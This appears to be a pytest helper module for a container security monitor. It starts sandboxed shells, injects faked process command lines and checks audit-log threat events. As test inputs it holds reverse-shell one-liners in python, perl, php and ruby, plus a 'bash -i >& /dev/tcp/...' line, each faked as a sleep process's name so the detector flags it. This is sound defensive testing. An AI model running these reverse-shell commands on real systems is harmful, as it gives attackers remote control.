"""Shared helpers for the security-monitoring integration tests
(tests/security_monitoring): container state, audit-log threat events,
process injection, and shared test inputs."""

import hashlib
import json
import os
import subprocess
import time
from pathlib import Path

import pytest


def get_container_name_from_workspace(workspace):
    """Generate expected container name from workspace path.

    Matches Go implementation in internal/session/naming.go:
    - Generates SHA256 hash of absolute workspace path
    - Takes first 8 hex characters
    - Format: coi-<hash>-<slot>
    """
    # Get absolute path (normalize like Go does)
    abs_path = os.path.abspath(workspace)
    # Generate SHA256 hash and take first 8 characters
    hash_digest = hashlib.sha256(abs_path.encode()).hexdigest()[:8]
    # Container name format: coi-<workspace-hash>-<slot>
    return f"coi-{hash_digest}-1"


def get_container_state(name):
    """Get container state."""
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return "Unknown"
    containers = json.loads(result.stdout)
    # `incus list <name>` matches by prefix (it also lists e.g. <name>-forensics-*),
    # so pick the exact name.
    match = [c for c in containers if c.get("name") == name]
    return match[0].get("status", "Unknown") if match else "Unknown"


def container_absent(name):
    """True when the container does not exist (was deleted), as opposed to a
    stopped or frozen container that still exists.

    A killed container is stopped AND deleted by the responder (killContainer:
    StopContainerQuiet + `incus delete`), so its terminal state is *absent* from
    `incus list`, not a non-Running status. Auto-kill tests poll on this rather
    than accepting "Stopped"/"Frozen"/"Unknown": auto-PAUSE freezes a container
    without deleting it, so a kill test that accepted "Frozen" would pass even if
    auto-kill had silently degraded to auto-pause.
    """
    result = subprocess.run(
        ["incus", "list", name, "--format=json"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return False
    try:
        containers = json.loads(result.stdout)
    except json.JSONDecodeError:
        return False
    # Prefix match: a forensic copy (<name>-forensics-*) must not count.
    return not any(c.get("name") == name for c in containers)


def wait_for_container_running(name, timeout=60):
    """Wait for container to reach Running state with retries.

    Returns True if container is Running, False if it never reached Running
    within the timeout period.

    Timeout is 60s (was 30s): on the heavily-parallel monitoring lanes a
    `coi shell` first-boot occasionally needs >30s, which surfaced as an
    intermittent "Container ... did not start" failure that passed on re-run.
    60s matches the sibling helper in test_log_watcher_inotify.py.
    """
    for _ in range(timeout):
        state = get_container_state(name)
        if state == "Running":
            return True
        time.sleep(1)
    return False


def get_threat_events(container_name):
    """Get threat events from audit log."""
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    if not log_path.exists():
        return []

    events = []
    with open(log_path) as f:
        for line in f:
            if line.strip():
                try:
                    event = json.loads(line)
                    if "level" in event:  # ThreatEvent
                        events.append(event)
                except json.JSONDecodeError:
                    pass
    return events


def poll_network_threats(container_name, max_wait=45):
    """Poll the audit log for `network`-category threats, up to max_wait seconds.

    Network detection reads /proc/<init-pid>/net/* on a poll cycle, so a threat
    can take several cycles to appear — a single fixed sleep races it. Returns the
    list of network threats (possibly empty if none appeared within the budget).
    """
    deadline = time.monotonic() + max_wait
    while time.monotonic() < deadline:
        net = [e for e in get_threat_events(container_name) if e.get("category") == "network"]
        if net:
            return net
        time.sleep(2)
    return [e for e in get_threat_events(container_name) if e.get("category") == "network"]


def find_container_cgroup_path(container_name: str) -> str | None:
    """The container's cgroup v2 directory, read from its init process's
    /proc/<pid>/cgroup (Incus names it lxc.payload.<name>, incus.payload/<name>,
    ... depending on the version, so guessing the name is unreliable).
    A trailing systemd scope (init.scope) is dropped, so the result is the
    container's root cgroup."""
    result = subprocess.run(
        ["incus", "query", f"/1.0/instances/{container_name}/state"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if result.returncode != 0:
        return None
    pid = json.loads(result.stdout).get("pid", 0)
    if not pid:
        return None
    try:
        with open(f"/proc/{pid}/cgroup") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return None
    rel = next((line[3:] for line in lines if line.startswith("0::")), None)
    if not rel:
        return None
    path = "/sys/fs/cgroup" + rel
    if path.endswith(".scope"):
        path = os.path.dirname(path)
    return path if os.path.isdir(path) else None


def cleanup_container(name, coi_binary):
    """Force cleanup container."""
    subprocess.run(
        [coi_binary, "container", "delete", name, "--force"],
        timeout=30,
        check=False,
    )


# Issue #842 parametrize inputs.
# (slot, faked-command-line) — benign interpreter one-liners that MUST NOT be killed:
# they contain colons (PATH, dict/JSON literals, timestamps) but no network endpoint.
BENIGN_ONELINERS = [
    (
        70,
        "source /home/code/.claude/shell-snapshots/snapshot-bash-1.sh 2>/dev/null || true "
        "&& export PATH=/usr/local/bin:/usr/bin:/bin && python3 -c print({'result': 2 + 2})",
    ),
    (71, "python -c import json; print(json.dumps({'ok': 1}))"),
    (72, "perl -e print scalar localtime, qq{ time: done\\n}"),
    (73, "ruby -e puts({a: 1, b: 2}).inspect"),
    (74, "php -r echo date('H:i:s');"),
]


# (slot, faked-command-line) — real reverse shells that MUST still be killed.
# Each carries a genuine network indicator (socket keyword / IP / host:port).
MALICIOUS_ONELINERS = [
    (
        75,
        'python3 -c import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444))',
    ),
    (
        76,
        'perl -e use Socket;$i="10.0.0.1";$p=4444;'
        'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))',
    ),
    (77, 'php -r $s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'),
    (78, 'ruby -rsocket -e f=TCPSocket.open("10.0.0.1",4444)'),
]


# ------------------------------------------------------------------ #
# Shared helpers for the #842 parametrized tests                      #
# ------------------------------------------------------------------ #


def start_shell(test_workspace, coi_binary, slot):
    """Start a monitored `coi shell` in the given slot, wait until Running, and
    let the monitoring baseline stabilize. Returns (container_name, proc)."""
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", test_workspace, "--slot", str(slot), "--debug"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    container_name = (
        get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + f"-{slot}"
    )
    if not wait_for_container_running(container_name):
        proc.terminate()
        pytest.fail(f"Container {container_name} did not start")
    # Let the monitoring baseline stabilize before injecting.
    time.sleep(10)
    return container_name, proc


def inject_faked_process(container_name, wrapped):
    """Spawn a long-lived process inside the container whose argv[0] is exactly
    `wrapped`, so the host-side monitor reads it from /proc/<pid>/cmdline."""
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            f"exec -a {json.dumps(wrapped)} sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def forensic_copies(container_name):
    """List <container>-forensics-* containers (name,status CSV rows)."""
    result = subprocess.run(
        ["incus", "list", "--format", "csv", "-c", "ns", f"{container_name}-forensics-"],
        capture_output=True,
        text=True,
        timeout=30,
    )
    return [row for row in result.stdout.strip().splitlines() if row]


def trigger_critical_and_wait_kill(coi_binary, test_workspace, slot, kill_timeout=35):
    """Start a shell, trigger a CRITICAL threat, wait up to kill_timeout seconds
    for the auto-kill. Returns (proc, container_name, killed)."""
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", test_workspace, "--slot", str(slot), "--debug"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    container_name = (
        get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + f"-{slot}"
    )
    if not wait_for_container_running(container_name):
        proc.terminate()
        pytest.fail(f"Container {container_name} did not start")
    time.sleep(10)  # let the monitoring baseline stabilize
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(5)
    killed = False
    for _ in range(kill_timeout):
        time.sleep(1)
        if container_absent(container_name):
            killed = True
            break
    return proc, container_name, killed


# Ordinary agent commands that resemble reverse-shell patterns and were, at
# some point, flagged CRITICAL (auto-kill) or HIGH (auto-pause). Reviews of
# #856/#857 reproduced each one; they must all leave the container running.
AGENT_COMMANDS_NOT_REVERSE_SHELLS = [
    # Writing a Kubernetes manifest with an exec probe and a TCP probe (the
    # agent's Bash tool puts the whole heredoc in argv).
    "bash -c cat > k8s.yaml <<EOF\nlivenessProbe:\n  exec:\n    command: [true]\n"
    "readinessProbe:\n  tcpSocket:\n    port: 8080\nEOF",
    # Searching code/docs for the detector's own pattern strings.
    "grep -rn /dev/tcp/ docs",
    'rg -n "/dev/tcp/" internal/',
    'rg -n "exec:" internal/',
    'rg -n "tcp:|exec:" src/',
    # Probing the agent's own local services.
    "bash -c </dev/tcp/localhost/5432",
    "bash -c </dev/tcp/127.1/8080",
    # Waiting for a local service whose port comes from a variable.
    "bash -c until echo > /dev/tcp/localhost/$PORT; do sleep 1; done",
    "bash -c until (</dev/tcp/127.0.0.1/${PORT:-8080}) 2>/dev/null; do sleep 1; done",
    # Running a project script with an -i flag; loading a non-socket IO module.
    "./scripts/setup.sh -i",
    "perl -MIO::File -e print 1",
    # Interpreter one-liners touching a local dev server or a unix socket path.
    "python3 -c import urllib.request; "
    'print(urllib.request.urlopen("http://127.0.0.1:8000/health").status)',
    'python3 -c import os; print(os.path.exists("/var/run/docker.sock"))',
]


def inject_literal_process(container_name, cmdline, seconds=60):
    """Spawn a long-lived process inside the container whose argv[0] is EXACTLY
    `cmdline`, so the host-side monitor reads it from /proc/<pid>/cmdline.

    The command line is passed as $0 of the inner shell instead of being
    spliced into the script, so quotes, `$`, `<` and newlines in it reach the
    monitor verbatim rather than being interpreted by bash first.
    """
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            f'exec -a "$0" sleep {seconds}',
            cmdline,
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def disk_space_warnings(container_name):
    return [
        e
        for e in get_threat_events(container_name)
        if e.get("level") == "warning"
        and e.get("category") == "filesystem"
        and (e.get("evidence") or {}).get("disk_space") is not None
    ]


def fill_tmp(container_name, name, size_mb):
    result = subprocess.run(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "dd",
            "if=/dev/zero",
            f"of=/tmp/{name}",
            "bs=1M",
            f"count={size_mb}",
        ],
        capture_output=True,
        text=True,
        timeout=60,
    )
    assert result.returncode == 0, f"could not fill /tmp: {result.stderr}"


def tmp_size_mb(container_name, timeout=30):
    """Size of the container's /tmp in MB, once the boot-time tmpfs is mounted."""
    total_mb = 0
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        df = subprocess.run(
            ["incus", "exec", container_name, "--", "df", "-BM", "--output=size", "/tmp"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        fields = df.stdout.split()
        if df.returncode == 0 and len(fields) == 2:
            total_mb = int(fields[1].rstrip("M"))
            if total_mb <= 64:
                break
        time.sleep(1)
    return total_mb


def run_exec_pattern_test(
    test_workspace,
    coi_binary,
    slot: int,
    pattern_name: str,
    exec_a_arg: str,
):
    """Verify a proc_event exec pattern fires using exec -a on a sleep process.

    Uses exec -a to set argv[0] of sleep to the given signature string so that
    PROC_EVENT_EXEC fires with the right cmdline without requiring the actual
    binary to be installed in the container.
    """
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = true
auto_pause_on_high = false
auto_kill_on_critical = false
poll_interval_sec = 1
file_read_threshold_mb = 500
file_read_rate_mb_per_sec = 1000
process_count_threshold = 9999
process_spawn_rate_threshold = 9999
"""
    )

    container_name = (
        get_container_name_from_workspace(str(test_workspace)).rsplit("-", 1)[0] + f"-{slot}"
    )
    proc = subprocess.Popen(
        [
            coi_binary,
            "shell",
            "--workspace",
            str(test_workspace),
            "--slot",
            str(slot),
            "--debug",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    try:
        assert wait_for_container_running(container_name), (
            f"Container {container_name} did not start"
        )

        time.sleep(3)  # allow monitoring daemon and PROC_EVENTS to initialise

        # exec -a sets argv[0] of sleep to the suspicious signature so the
        # proc_event watcher sees the right cmdline without needing the binary.
        # PROC_EVENT_EXEC fires once per execve; the proc-connector subscription
        # may not be active yet while the daemon is still starting under CI load,
        # so a single exec can be missed. Re-fire on a short cadence inside the
        # poll loop — each launch is a fresh execve, guaranteeing one fires after
        # the subscription is active. sleep 5 (not 10) keeps re-fired processes
        # from piling up while still living long enough for the daemon to read
        # /proc after the exec event.
        def fire():
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    f"exec -a '{exec_a_arg}' sleep 5",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

        fire()

        proc_events = []
        events = []
        for i in range(40):
            events = get_threat_events(container_name)
            proc_events = [
                e
                for e in events
                if e.get("category") == "proc_event"
                and e.get("evidence", {}).get("proc_event", {}).get("pattern") == pattern_name
            ]
            if proc_events:
                break
            if i % 3 == 2:
                fire()
            time.sleep(1)

        assert len(proc_events) > 0, (
            f"Expected proc_event threat for {pattern_name}, got events: {events}"
        )
        assert proc_events[0].get("level") == "high", (
            f"Expected HIGH for {pattern_name}, got: {proc_events[0].get('level')}"
        )
    finally:
        proc.terminate()
        if backup:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()
        cleanup_container(container_name, coi_binary)


def coi_session_logs(container_name, tail=4000):
    """Tail of coi's session logs (~/.coi/logs/<container>*), for failure messages."""
    out = ""
    for log in sorted((Path.home() / ".coi" / "logs").glob(f"{container_name}*")):
        try:
            out += f"\n--- {log.name} ---\n" + log.read_text()[-tail:]
        except OSError:
            pass
    return out or "\n(no coi session logs)"
